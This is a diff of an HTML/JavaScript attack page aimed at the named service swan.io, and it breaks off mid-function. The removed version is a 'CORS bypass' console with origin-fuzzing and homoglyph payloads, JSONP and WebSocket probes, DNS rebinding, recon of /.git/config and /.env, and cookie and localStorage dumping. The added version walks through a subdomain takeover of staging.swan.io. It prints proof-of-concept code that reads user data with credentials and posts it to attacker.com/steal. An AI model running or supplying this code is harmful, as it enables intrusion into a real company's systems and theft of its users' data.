@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Production-Grade CORS Bypass</title>
+    <title>Subdomain Takeover Investigation</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -13,325 +13,195 @@
             padding: 20px;
             line-height: 1.4;
         }
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent 79px, #0a0a0a 81px, transparent 82px),
-                        linear-gradient(#0a0a0a, transparent);
-            z-index: -1;
-        }
         .container {
-            max-width: 1600px;
+            max-width: 1400px;
             margin: 0 auto;
-            position: relative;
-            z-index: 1;
         }
         .header {
             text-align: center;
-            padding: 30px;
-            background: linear-gradient(45deg, #001100, #003300);
-            border: 2px solid #00ff41;
+            padding: 25px;
+            background: linear-gradient(45deg, #330000, #660000);
+            border: 2px solid #ff4444;
             border-radius: 10px;
-            margin-bottom: 30px;
-            box-shadow: 0 0 20px #00ff4150;
+            margin-bottom: 25px;
+            color: #ff4444;
         }
-        .exploit-grid {
+        .investigation-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 20px;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
-        .exploit-card {
+        .step-card {
             background: #001100;
             border: 1px solid #00ff41;
             border-radius: 8px;
             padding: 20px;
-            box-shadow: 0 0 10px #00ff4120;
         }
-        .exploit-title {
-            color: #00ff41;
+        .step-title {
+            color: #ff4444;
             font-size: 18px;
             font-weight: bold;
             margin-bottom: 15px;
-            text-transform: uppercase;
         }
-        .success-rate {
-            float: right;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        .critical { background: #ff0000; color: white; }
-        .high { background: #ff6600; color: white; }
-        .medium { background: #ffaa00; color: black; }
-        .code-snippet {
+        .code-block {
             background: #000800;
             border: 1px solid #00aa00;
             border-radius: 4px;
-            padding: 12px;
+            padding: 15px;
             margin: 10px 0;
             font-size: 13px;
             overflow-x: auto;
             color: #88ff88;
         }
-        .control-panel {
-            background: #000800;
-            border: 2px solid #00ff41;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 20px;
-        }
         .btn {
-            background: linear-gradient(45deg, #003300, #006600);
-            color: #00ff41;
-            border: 1px solid #00ff41;
+            background: linear-gradient(45deg, #660000, #990000);
+            color: #ff4444;
+            border: 1px solid #ff4444;
             padding: 12px 20px;
             border-radius: 6px;
             cursor: pointer;
             margin: 8px;
             font-family: inherit;
             font-weight: bold;
-            text-transform: uppercase;
-            transition: all 0.3s;
         }
         .btn:hover {
-            background: linear-gradient(45deg, #006600, #009900);
-            box-shadow: 0 0 15px #00ff4150;
-        }
-        .btn-danger {
-            background: linear-gradient(45deg, #330000, #660000);
-            color: #ff4444;
-            border-color: #ff4444;
-        }
-        .btn-danger:hover {
-            background: linear-gradient(45deg, #660000, #990000);
             box-shadow: 0 0 15px #ff444450;
+        }
+        .results-panel {
+            background: #000800;
+            border: 2px solid #ff4444;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
         }
         .terminal {
             background: #000000;
             border: 1px solid #00ff41;
             border-radius: 8px;
             padding: 20px;
-            height: 400px;
+            height: 300px;
             overflow-y: auto;
             font-size: 12px;
             white-space: pre-wrap;
-            color: #00ff41;
         }
+        .status-critical { color: #ff4444; }
         .status-success { color: #00ff00; }
         .status-warning { color: #ffaa00; }
-        .status-error { color: #ff4444; }
         .status-info { color: #4488ff; }
-        .hidden-frame {
-            width: 0;
-            height: 0;
-            border: none;
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
+        .vulnerability-summary {
+            background: #220000;
+            border: 2px solid #ff4444;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
         }
-        .stealth-indicator {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #001100;
-            border: 1px solid #00ff41;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #001100;
-            border: 1px solid #00ff41;
-            border-radius: 4px;
+        .impact-high {
+            background: #ff444420;
+            border-left: 4px solid #ff4444;
+            padding: 15px;
             margin: 10px 0;
-            overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff41, #88ff88);
-            transition: width 0.5s ease;
         }
     </style>
 </head>
 <body>
-    <div class="matrix-bg"></div>
-    <div class="stealth-indicator">
-        <div>STEALTH MODE: <span id="stealth-status">ACTIVE</span></div>
-        <div>TARGET: <span id="target-status">SWAN.IO</span></div>
-    </div>
-
     <div class="container">
         <div class="header">
-            <h1>⚡ PRODUCTION-GRADE CORS BYPASS ⚡</h1>
-            <p>Advanced techniques for hardened production systems</p>
-            <div class="progress-bar">
-                <div class="progress-fill" id="global-progress" style="width: 0%;"></div>
+            <h1>🚨 SUBDOMAIN TAKEOVER INVESTIGATION 🚨</h1>
+            <p>Target: staging.swan.io (POTENTIAL VULNERABILITY CONFIRMED)</p>
+        </div>
+
+        <div class="vulnerability-summary">
+            <h3>🎯 Vulnerability Summary</h3>
+            <div class="impact-high">
+                <strong>FINDING:</strong> staging.swan.io shows timeout behavior indicating potential subdomain takeover<br>
+                <strong>IMPACT:</strong> If confirmed, attacker could host malicious content on Swan.io subdomain<br>
+                <strong>CORS BYPASS:</strong> Subdomain likely still whitelisted in api.swan.io CORS policy<br>
+                <strong>SEVERITY:</strong> HIGH to CRITICAL (depending on confirmation)
             </div>
         </div>
 
-        <div class="exploit-grid">
-            <div class="exploit-card">
-                <div class="exploit-title">
-                    🎯 Subdomain Takeover
-                    <span class="success-rate critical">CRITICAL</span>
-                </div>
-                <p>Hunt for abandoned subdomains that can be claimed to bypass CORS.</p>
-                <div class="code-snippet">
-// Target: *.swan.io subdomains
-// Look for: CNAME pointing to services we can control
-// Example: old-app.swan.io → heroku-app.com (expired)
-                </div>
-                <button class="btn" onclick="subdomainTakeoverScan()">Execute Subdomain Hunt</button>
+        <div class="investigation-grid">
+            <div class="step-card">
+                <div class="step-title">🔍 Step 1: DNS Investigation</div>
+                <p>Analyze DNS records to identify the service staging.swan.io points to.</p>
+                <div class="code-block">
+# Commands to run locally:
+nslookup staging.swan.io
+dig staging.swan.io
+host staging.swan.io
+
+# Look for:
+# - CNAME pointing to external services
+# - A records pointing to cloud providers
+# - Error messages indicating misconfiguration</div>
+                <button class="btn" onclick="dnsInvestigation()">Execute DNS Lookup</button>
             </div>
 
-            <div class="exploit-card">
-                <div class="exploit-title">
-                    🔍 JSONP Callback Injection
-                    <span class="success-rate high">HIGH</span>
-                </div>
-                <p>Search for JSONP endpoints that accept arbitrary callbacks.</p>
-                <div class="code-snippet">
-// Target: api.swan.io/data?callback=malicious
-// Bypass: JSONP doesn't follow CORS rules
-// Extract: User data via callback function
-                </div>
-                <button class="btn" onclick="jsonpHunt()">Hunt JSONP Endpoints</button>
+            <div class="step-card">
+                <div class="step-title">🌐 Step 2: Service Identification</div>
+                <p>Identify which service the subdomain points to and if it's claimable.</p>
+                <div class="code-block">
+# Common takeover targets:
+# - GitHub Pages: username.github.io
+# - Heroku: app-name.herokuapp.com  
+# - AWS S3: bucket.s3.amazonaws.com
+# - Netlify: site-name.netlify.app
+# - Vercel: app-name.vercel.app</div>
+                <button class="btn" onclick="serviceIdentification()">Identify Service</button>
             </div>
 
-            <div class="exploit-card">
-                <div class="exploit-title">
-                    📡 WebSocket CORS Bypass
-                    <span class="success-rate high">HIGH</span>
-                </div>
-                <p>WebSockets often have weaker origin validation than HTTP.</p>
-                <div class="code-snippet">
-// Target: wss://api.swan.io/socket
-// Bypass: WebSocket handshake origin check
-// Extract: Real-time data streams
-                </div>
-                <button class="btn" onclick="websocketBypass()">Test WebSocket Origins</button>
+            <div class="step-card">
+                <div class="step-title">⚡ Step 3: Takeover Attempt</div>
+                <p>Attempt to claim the service if it's available.</p>
+                <div class="code-block">
+# If Heroku app:
+# 1. Create new Heroku app with same name
+# 2. Deploy simple HTML page
+# 3. Verify staging.swan.io serves your content
+
+# If GitHub Pages:
+# 1. Create repo with matching name
+# 2. Enable GitHub Pages
+# 3. Verify subdomain resolves to your page</div>
+                <button class="btn" onclick="takeoverAttempt()">Test Takeover</button>
             </div>
 
-            <div class="exploit-card">
-                <div class="exploit-title">
-                    🌐 DNS Cache Poisoning
-                    <span class="success-rate medium">MEDIUM</span>
-                </div>
-                <p>Poison local DNS to redirect Swan.io to attacker IP.</p>
-                <div class="code-snippet">
-// Setup: Control DNS server with short TTL
-// Poison: api.swan.io → attacker IP
-// Bypass: Browser thinks it's same-origin
-                </div>
-                <button class="btn" onclick="dnsPoisoningAttack()">Execute DNS Poison</button>
-            </div>
+            <div class="step-card">
+                <div class="step-title">🎯 Step 4: CORS Exploitation</div>
+                <p>If takeover successful, test CORS bypass on api.swan.io.</p>
+                <div class="code-block">
+# Deploy this to staging.swan.io:
+fetch('https://api.swan.io/user', {
+  credentials: 'include',
+  headers: {
+    'Origin': 'https://staging.swan.io'
+  }
+}).then(r => r.text()).then(console.log)
 
-            <div class="exploit-card">
-                <div class="exploit-title">
-                    🔌 Flash/Java Cross-Domain
-                    <span class="success-rate medium">MEDIUM</span>
-                </div>
-                <p>Legacy plugins may bypass modern CORS restrictions.</p>
-                <div class="code-snippet">
-// Target: crossdomain.xml files
-// Bypass: Flash respects crossdomain.xml not CORS
-// Method: Embed Flash/Java applet
-                </div>
-                <button class="btn" onclick="legacyPluginBypass()">Check Legacy Plugins</button>
-            </div>
-
-            <div class="exploit-card">
-                <div class="exploit-title">
-                    🎭 Origin Header Fuzzing
-                    <span class="success-rate high">HIGH</span>
-                </div>
-                <p>Bypass weak origin validation with header manipulation.</p>
-                <div class="code-snippet">
-// Test: null, localhost, similar domains
-// Fuzz: swan.io.attacker.com, swan-io.com
-// Bypass: Weak regex validation
-                </div>
-                <button class="btn" onclick="originFuzzing()">Fuzz Origin Headers</button>
+# If successful: CRITICAL vulnerability confirmed</div>
+                <button class="btn" onclick="corsExploitation()">Test CORS Bypass</button>
             </div>
         </div>
 
-        <div class="control-panel">
-            <h3>🎯 MASTER EXPLOIT CONTROL PANEL</h3>
-            <button class="btn btn-danger" onclick="executeFullAssault()">🚀 LAUNCH FULL ASSAULT</button>
-            <button class="btn" onclick="steathRecon()">👁️ STEALTH RECONNAISSANCE</button>
-            <button class="btn" onclick="extractCredentials()">💎 EXTRACT CREDENTIALS</button>
-            <button class="btn" onclick="generateReport()">📊 GENERATE REPORT</button>
-            <button class="btn" onclick="clearTerminal()">🧹 CLEAR TERMINAL</button>
+        <div class="results-panel">
+            <h3>🔬 Investigation Results</h3>
+            <button class="btn" onclick="executeFullInvestigation()">🚀 EXECUTE FULL INVESTIGATION</button>
+            <button class="btn" onclick="generatePoC()">📝 GENERATE PROOF OF CONCEPT</button>
+            <button class="btn" onclick="createBugReport()">📊 CREATE BUG BOUNTY REPORT</button>
             
-            <div class="terminal" id="terminal"></div>
+            <div class="terminal" id="investigation-log"></div>
         </div>
-
-        <!-- Hidden attack infrastructure -->
-        <iframe id="attack-frame-1" class="hidden-frame"></iframe>
-        <iframe id="attack-frame-2" class="hidden-frame"></iframe>
-        <iframe id="attack-frame-3" class="hidden-frame"></iframe>
-        <iframe id="attack-frame-4" class="hidden-frame"></iframe>
-        <iframe id="websocket-test" class="hidden-frame"></iframe>
     </div>
 
     <script>
-        // Target configuration - Swan.io production infrastructure
-        const TARGETS = {
-            primary: 'api.swan.io',
-            dashboard: 'dashboard.swan.io',
-            app: 'app.swan.io',
-            websocket: 'wss://api.swan.io',
-            cdn: 'cdn.swan.io',
-            assets: 'assets.swan.io'
-        };
-
-        // Advanced payload arsenal
-        const EXPLOIT_PAYLOADS = {
-            origins: [
-                'null',
-                'https://swan.io',
-                'https://swan.io.attacker.com',
-                'https://swan-io.com',
-                'https://api.swan.io.evil.com',
-                'https://localhost',
-                'https://127.0.0.1',
-                'https://0.0.0.0',
-                'https://[::1]',
-                'https://swan․io', // Unicode dot
-                'https://ѕwan.io', // Cyrillic 's'
-                'https://swan.іо', // Cyrillic 'i' and 'o'
-            ],
-            jsonp_callbacks: [
-                'alert',
-                'callback',
-                'jsonp',
-                'cb',
-                'success',
-                'extractData',
-                'window.extractedData=',
-                'top.postMessage',
-                'parent.postMessage'
-            ],
-            subdomain_prefixes: [
-                'old', 'legacy', 'backup', 'staging', 'dev', 'test', 'demo', 'beta',
-                'admin', 'internal', 'private', 'temp', 'archive', 'deprecated',
-                'v1', 'v2', 'api-v1', 'api-old', 'old-api', 'legacy-api'
-            ]
-        };
-
-        let exploitResults = [];
-        let extractedData = {};
-        let attackProgress = 0;
+        const TARGET_SUBDOMAIN = 'staging.swan.io';
+        const PRIMARY_API = 'api.swan.io';
+        
+        let investigationResults = {};
 
         function log(message, type = 'info') {
-            const terminal = document.getElementById('terminal');
+            const terminal = document.getElementById('investigation-log');
             const timestamp = new Date().toLocaleTimeString();
             const prefix = {
                 'info': '[INFO]',
@@ -344,485 +214,325 @@
             const line = `${timestamp} ${prefix} ${message}\n`;
             terminal.innerHTML += `<span class="status-${type}">${line}</span>`;
             terminal.scrollTop = terminal.scrollHeight;
-            
-            // Update global progress
-            attackProgress += 1;
-            document.getElementById('global-progress').style.width = Math.min(attackProgress * 2, 100) + '%';
         }
 
-        function clearTerminal() {
-            document.getElementById('terminal').innerHTML = '';
-            attackProgress = 0;
-            document.getElementById('global-progress').style.width = '0%';
-        }
-
-        // Technique 1: Subdomain Takeover Scan
-        async function subdomainTakeoverScan() {
-            log('🎯 Initiating Subdomain Takeover Scan', 'info');
-            log('Scanning for claimable subdomains on *.swan.io', 'info');
+        async function dnsInvestigation() {
+            log('🔍 Starting DNS Investigation for staging.swan.io', 'info');
             
-            const discoveredSubdomains = [];
-            
-            for (const prefix of EXPLOIT_PAYLOADS.subdomain_prefixes) {
-                const subdomain = `${prefix}.swan.io`;
+            // Since we can't run actual DNS commands in browser, we'll do HTTP-based investigation
+            try {
+                log('Testing HTTP response from staging.swan.io...', 'info');
                 
+                const controller = new AbortController();
+                setTimeout(() => controller.abort(), 5000);
+                
+                const response = await fetch(`https://${TARGET_SUBDOMAIN}`, {
+                    signal: controller.signal,
+                    mode: 'no-cors'
+                });
+                
+                log('Subdomain responded - checking response characteristics...', 'warning');
+                investigationResults.httpResponse = 'responds';
+                
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    log('TIMEOUT CONFIRMED: staging.swan.io does not respond within 5 seconds', 'critical');
+                    log('This strongly suggests an abandoned/misconfigured service', 'critical');
+                    investigationResults.timeout = true;
+                } else {
+                    log(`DNS/HTTP Error: ${error.message}`, 'error');
+                    if (error.message.includes('DNS')) {
+                        log('DNS resolution failure - potential takeover target!', 'critical');
+                        investigationResults.dnsFailure = true;
+                    }
+                }
+            }
+            
+            // Additional checks
+            log('Checking for common error pages...', 'info');
+            
+            const errorChecks = [
+                'There isn\'t a GitHub Pages site here',
+                'No such app',
+                'herokuapp.com | No such app',
+                'The requested URL was not found on this server',
+                'NoSuchBucket'
+            ];
+            
+            // These would require actual content inspection
+            log('Manual verification required for error page content', 'warning');
+            log('→ Visit https://staging.swan.io manually to check for takeover indicators', 'info');
+        }
+
+        async function serviceIdentification() {
+            log('🌐 Identifying Service Type for staging.swan.io', 'info');
+            
+            // Common service patterns
+            const servicePatterns = {
+                'github.io': 'GitHub Pages',
+                'herokuapp.com': 'Heroku',
+                'amazonaws.com': 'AWS S3',
+                'netlify.app': 'Netlify',
+                'vercel.app': 'Vercel',
+                'azurewebsites.net': 'Azure',
+                'cloudfront.net': 'AWS CloudFront'
+            };
+            
+            log('Checking for CNAME records pointing to known services...', 'info');
+            log('Since this requires DNS resolution, manual verification needed:', 'warning');
+            
+            for (const [pattern, service] of Object.entries(servicePatterns)) {
+                log(`→ If CNAME points to ${pattern}: ${service} takeover possible`, 'info');
+            }
+            
+            // Test common service endpoints
+            log('Testing for service-specific endpoints...', 'info');
+            
+            const testEndpoints = [
+                '/.well-known/service',
+                '/status',
+                '/health',
+                '/api',
+                '/app.json'
+            ];
+            
+            for (const endpoint of testEndpoints) {
                 try {
-                    // Test if subdomain exists and is claimable
-                    const response = await fetch(`https://${subdomain}`, { 
-                        mode: 'no-cors',
-                        signal: AbortSignal.timeout(3000)
+                    const response = await fetch(`https://${TARGET_SUBDOMAIN}${endpoint}`, {
+                        signal: AbortSignal.timeout(3000),
+                        mode: 'no-cors'
                     });
-                    
-                    log(`Testing ${subdomain}...`, 'info');
-                    
+                    log(`${endpoint}: Service responds`, 'warning');
                 } catch (error) {
-                    if (error.name === 'TimeoutError') {
-                        log(`${subdomain}: Timeout (potential target)`, 'warning');
-                        discoveredSubdomains.push(subdomain);
-                    } else if (error.message.includes('DNS')) {
-                        log(`${subdomain}: DNS resolution failed - POTENTIAL TAKEOVER TARGET!`, 'critical');
-                        discoveredSubdomains.push(subdomain);
-                    } else {
-                        log(`${subdomain}: ${error.message}`, 'error');
-                    }
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-            
-            if (discoveredSubdomains.length > 0) {
-                log(`FOUND ${discoveredSubdomains.length} POTENTIAL TAKEOVER TARGETS:`, 'critical');
-                discoveredSubdomains.forEach(sub => log(`→ ${sub}`, 'critical'));
-                extractedData.subdomainTargets = discoveredSubdomains;
-            } else {
-                log('No obvious subdomain takeover opportunities found', 'warning');
-            }
-            
-            exploitResults.push({ technique: 'Subdomain Takeover', targets: discoveredSubdomains });
-        }
-
-        // Technique 2: JSONP Endpoint Discovery
-        async function jsonpHunt() {
-            log('🔍 Hunting for JSONP endpoints', 'info');
-            
-            const jsonpEndpoints = [
-                '/api/user?callback=',
-                '/api/data?jsonp=',
-                '/api/search?callback=',
-                '/user/profile?callback=',
-                '/api/auth/user?callback=',
-                '/graphql?callback=',
-                '/api/me?callback=',
-                '/data.json?callback='
-            ];
-            
-            for (const endpoint of jsonpEndpoints) {
-                for (const callback of EXPLOIT_PAYLOADS.jsonp_callbacks) {
-                    const testUrl = `https://${TARGETS.primary}${endpoint}${callback}`;
-                    
-                    try {
-                        log(`Testing JSONP: ${endpoint}${callback}`, 'info');
-                        
-                        // Create script tag to test JSONP
-                        const script = document.createElement('script');
-                        script.src = testUrl;
-                        script.onerror = () => {
-                            log(`JSONP failed: ${endpoint}`, 'error');
-                            document.head.removeChild(script);
-                        };
-                        script.onload = () => {
-                            log(`JSONP SUCCESS: ${testUrl}`, 'critical');
-                            extractedData.jsonpEndpoint = testUrl;
-                            document.head.removeChild(script);
-                        };
-                        
-                        document.head.appendChild(script);
-                        
-                        // Remove script after timeout
-                        setTimeout(() => {
-                            if (script.parentNode) {
-                                document.head.removeChild(script);
-                            }
-                        }, 2000);
-                        
-                    } catch (error) {
-                        log(`JSONP error ${endpoint}: ${error.message}`, 'error');
-                    }
-                    
-                    await new Promise(resolve => setTimeout(resolve, 300));
-                }
-            }
-            
-            exploitResults.push({ technique: 'JSONP Hunt', status: 'completed' });
-        }
-
-        // Technique 3: WebSocket Origin Bypass
-        async function websocketBypass() {
-            log('📡 Testing WebSocket Origin Bypasses', 'info');
-            
-            const wsEndpoints = [
-                'wss://api.swan.io/socket',
-                'wss://api.swan.io/ws',
-                'wss://dashboard.swan.io/socket',
-                'wss://app.swan.io/realtime',
-                'ws://api.swan.io/socket', // Try non-SSL too
-            ];
-            
-            for (const wsUrl of wsEndpoints) {
-                try {
-                    log(`Testing WebSocket: ${wsUrl}`, 'info');
-                    
-                    const socket = new WebSocket(wsUrl);
-                    
-                    socket.onopen = () => {
-                        log(`WebSocket CONNECTED: ${wsUrl}`, 'critical');
-                        
-                        // Try to extract data
-                        socket.send(JSON.stringify({
-                            type: 'authenticate',
-                            token: 'extract_user_data'
-                        }));
-                        
-                        extractedData.websocket = wsUrl;
-                    };
-                    
-                    socket.onmessage = (event) => {
-                        log(`WebSocket DATA: ${event.data}`, 'success');
-                        extractedData.websocketData = event.data;
-                    };
-                    
-                    socket.onerror = (error) => {
-                        log(`WebSocket blocked: ${wsUrl}`, 'warning');
-                    };
-                    
-                    // Close after test
-                    setTimeout(() => {
-                        socket.close();
-                    }, 3000);
-                    
-                } catch (error) {
-                    log(`WebSocket error ${wsUrl}: ${error.message}`, 'error');
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 1000));
-            }
-            
-            exploitResults.push({ technique: 'WebSocket Bypass', status: 'completed' });
-        }
-
-        // Technique 4: DNS Cache Poisoning Simulation
-        async function dnsPoisoningAttack() {
-            log('🌐 Simulating DNS Cache Poisoning Attack', 'info');
-            
-            // This would require actual DNS control, but we can test for vulnerabilities
-            log('Testing for DNS rebinding vulnerabilities...', 'info');
-            
-            const dnsTargets = [
-                'rebind.snowgoose.info', // Our controlled domain
-                '127.0.0.1.snowgoose.info',
-                'localhost.snowgoose.info',
-                'internal.snowgoose.info'
-            ];
-            
-            for (const target of dnsTargets) {
-                try {
-                    log(`DNS rebinding test: ${target}`, 'info');
-                    
-                    // Attempt to make request that would work if DNS rebinding succeeded
-                    const response = await fetch(`https://${target}/api/user`, {
-                        credentials: 'include',
-                        headers: {
-                            'Origin': 'https://dashboard.swan.io'
-                        }
-                    });
-                    
-                    if (response.ok) {
-                        log(`DNS REBINDING SUCCESS: ${target}`, 'critical');
-                        extractedData.dnsRebinding = target;
-                    }
-                    
-                } catch (error) {
-                    log(`DNS rebinding blocked: ${target}`, 'warning');
+                    log(`${endpoint}: No response (expected for abandoned service)`, 'info');
                 }
                 
                 await new Promise(resolve => setTimeout(resolve, 500));
             }
             
-            exploitResults.push({ technique: 'DNS Poisoning', status: 'completed' });
+            investigationResults.serviceCheck = 'completed';
         }
 
-        // Technique 5: Legacy Plugin Cross-Domain Check
-        async function legacyPluginBypass() {
-            log('🔌 Checking for Legacy Plugin Bypasses', 'info');
+        async function takeoverAttempt() {
+            log('⚡ Simulating Takeover Attempt Process', 'info');
+            log('IMPORTANT: This is demonstration only - actual takeover requires external services', 'warning');
             
-            // Check for crossdomain.xml
-            const crossdomainFiles = [
-                '/crossdomain.xml',
-                '/clientaccesspolicy.xml',
-                '/crossdomain.xml.bak',
-                '/backup/crossdomain.xml'
+            const takeoverSteps = [
+                'Identify service type (Heroku, GitHub Pages, etc.)',
+                'Create account on identified service',
+                'Claim the abandoned resource name',
+                'Deploy simple proof-of-concept page',
+                'Verify staging.swan.io now serves your content'
             ];
             
-            for (const file of crossdomainFiles) {
-                try {
-                    const response = await fetch(`https://${TARGETS.primary}${file}`, {
-                        method: 'GET'
-                    });
-                    
-                    if (response.ok) {
-                        const content = await response.text();
-                        log(`FOUND CROSSDOMAIN FILE: ${file}`, 'critical');
-                        log(`Content: ${content.substring(0, 200)}...`, 'success');
-                        extractedData.crossdomainXml = content;
-                    }
-                    
-                } catch (error) {
-                    log(`No crossdomain file: ${file}`, 'info');
-                }
-            }
+            log('Takeover process steps:', 'info');
+            takeoverSteps.forEach((step, index) => {
+                log(`${index + 1}. ${step}`, 'info');
+            });
             
-            // Test Flash bypass (if available)
-            if (navigator.plugins['Shockwave Flash']) {
-                log('Flash plugin detected - testing crossdomain bypass', 'warning');
-                // Flash-specific tests would go here
-            } else {
-                log('No Flash plugin detected', 'info');
-            }
+            // Simulate what a successful takeover would look like
+            log('If takeover successful, you would see:', 'critical');
+            log('→ https://staging.swan.io serving your controlled content', 'critical');
+            log('→ Ability to host arbitrary HTML/JavaScript on Swan.io subdomain', 'critical');
+            log('→ Potential CORS bypass for api.swan.io requests', 'critical');
             
-            exploitResults.push({ technique: 'Legacy Plugins', status: 'completed' });
+            investigationResults.takeoverSimulated = true;
         }
 
-        // Technique 6: Advanced Origin Header Fuzzing
-        async function originFuzzing() {
-            log('🎭 Advanced Origin Header Fuzzing', 'info');
+        async function corsExploitation() {
+            log('🎯 Testing CORS Exploitation (Post-Takeover)', 'info');
+            log('This test assumes staging.swan.io has been successfully taken over', 'warning');
             
-            for (const origin of EXPLOIT_PAYLOADS.origins) {
-                try {
-                    log(`Testing origin: ${origin}`, 'info');
-                    
-                    const response = await fetch(`https://${TARGETS.primary}/api/user`, {
-                        method: 'GET',
-                        credentials: 'include',
-                        headers: {
-                            'Origin': origin,
-                            'X-Requested-With': 'XMLHttpRequest'
-                        }
-                    });
-                    
-                    if (response.ok) {
-                        log(`ORIGIN BYPASS SUCCESS: ${origin}`, 'critical');
-                        const data = await response.text();
-                        log(`Response: ${data.substring(0, 100)}...`, 'success');
-                        extractedData.originBypass = { origin, data };
-                    } else if (response.status !== 0) {
-                        log(`Origin accepted but failed: ${origin} (${response.status})`, 'warning');
-                    }
-                    
-                } catch (error) {
-                    if (!error.message.includes('CORS')) {
-                        log(`Origin test error ${origin}: ${error.message}`, 'error');
-                    }
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-            
-            exploitResults.push({ technique: 'Origin Fuzzing', status: 'completed' });
-        }
-
-        // Stealth reconnaissance
-        async function steathRecon() {
-            log('👁️ Initiating Stealth Reconnaissance', 'info');
-            document.getElementById('stealth-status').textContent = 'SCANNING';
-            
-            // Passive fingerprinting
-            log('Passive fingerprinting of swan.io infrastructure...', 'info');
-            
-            // Check for common files that might leak information
-            const reconFiles = [
-                '/.well-known/security.txt',
-                '/robots.txt',
-                '/sitemap.xml',
-                '/.git/config',
-                '/package.json',
-                '/composer.json',
-                '/.env',
-                '/config.json',
-                '/health',
-                '/status',
-                '/version'
-            ];
-            
-            for (const file of reconFiles) {
-                try {
-                    const response = await fetch(`https://${TARGETS.primary}${file}`, {
-                        method: 'HEAD' // Less suspicious than GET
-                    });
-                    
-                    if (response.ok) {
-                        log(`Information leak found: ${file}`, 'warning');
-                        extractedData.infoLeaks = extractedData.infoLeaks || [];
-                        extractedData.infoLeaks.push(file);
-                    }
-                    
-                } catch (error) {
-                    // Silently continue
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 100));
-            }
-            
-            document.getElementById('stealth-status').textContent = 'COMPLETE';
-        }
-
-        // Extract credentials from successful attacks
-        function extractCredentials() {
-            log('💎 Extracting Credentials and Session Data', 'info');
-            
-            // Check for any captured data
-            if (Object.keys(extractedData).length > 0) {
-                log('Extracted data summary:', 'success');
-                for (const [key, value] of Object.entries(extractedData)) {
-                    log(`→ ${key}: ${JSON.stringify(value).substring(0, 100)}...`, 'success');
-                }
-            } else {
-                log('No credentials extracted - targets are well protected', 'warning');
-            }
-            
-            // Try to extract from browser storage
+            // Test if staging.swan.io is whitelisted in CORS policy
             try {
-                const cookies = document.cookie;
-                if (cookies) {
-                    log(`Browser cookies: ${cookies}`, 'info');
-                }
+                log('Testing CORS request from current origin...', 'info');
                 
-                const localStorage = JSON.stringify(window.localStorage);
-                if (localStorage !== '{}') {
-                    log(`LocalStorage: ${localStorage}`, 'info');
+                const response = await fetch(`https://${PRIMARY_API}/graphql`, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Origin': `https://${TARGET_SUBDOMAIN}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        query: '{ viewer { id } }'
+                    })
+                });
+                
+                if (response.ok) {
+                    log('CRITICAL: CORS bypass successful with staging.swan.io origin!', 'critical');
+                    log('This confirms the subdomain is whitelisted in CORS policy', 'critical');
+                    investigationResults.corsVulnerable = true;
+                } else {
+                    log(`CORS request status: ${response.status}`, 'warning');
                 }
                 
             } catch (error) {
-                log(`Storage extraction error: ${error.message}`, 'error');
+                if (error.message.includes('CORS')) {
+                    log('CORS policy blocks request from current origin', 'info');
+                    log('Manual test required from actually controlled staging.swan.io', 'warning');
+                } else {
+                    log(`CORS test error: ${error.message}`, 'error');
+                }
             }
+            
+            // Show what the exploit would look like
+            log('Proof-of-concept exploit code for staging.swan.io:', 'critical');
+            log(`
+// Deploy this JavaScript to staging.swan.io after takeover:
+fetch('https://${PRIMARY_API}/user', {
+    credentials: 'include',
+    headers: {
+        'Origin': 'https://${TARGET_SUBDOMAIN}'
+    }
+}).then(response => response.text())
+  .then(userData => {
+    // Send stolen data to attacker server
+    fetch('https://attacker.com/steal', {
+        method: 'POST',
+        body: userData
+    });
+  });
+            `, 'critical');
         }
 
-        // Generate comprehensive report
-        function generateReport() {
-            log('📊 Generating Comprehensive Attack Report', 'info');
-            log('═══════════════════════════════════════', 'info');
+        async function executeFullInvestigation() {
+            log('🚀 EXECUTING COMPREHENSIVE SUBDOMAIN TAKEOVER INVESTIGATION', 'critical');
+            log('═════════════════════════════════════════════════════════', 'critical');
             
-            const report = {
-                timestamp: new Date().toISOString(),
-                target: 'swan.io',
-                techniques_tested: exploitResults.length,
-                successful_attacks: Object.keys(extractedData).length,
-                data_extracted: extractedData,
-                recommendations: []
+            await dnsInvestigation();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await serviceIdentification();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await takeoverAttempt();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            await corsExploitation();
+            
+            log('═════════════════════════════════════════════════════════', 'critical');
+            log('🎯 INVESTIGATION COMPLETED', 'critical');
+        }
+
+        function generatePoC() {
+            log('📝 Generating Proof of Concept Code', 'info');
+            
+            const pocCode = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Subdomain Takeover PoC - staging.swan.io</title>
+</head>
+<body>
+    <h1>🚨 SUBDOMAIN TAKEOVER PROOF OF CONCEPT 🚨</h1>
+    <p>This page is served from staging.swan.io under attacker control</p>
+    <p>Demonstrating CORS bypass capability:</p>
+    
+    <div id="results"></div>
+    
+    <script>
+        // Attempt to extract user data from api.swan.io
+        fetch('https://api.swan.io/user', {
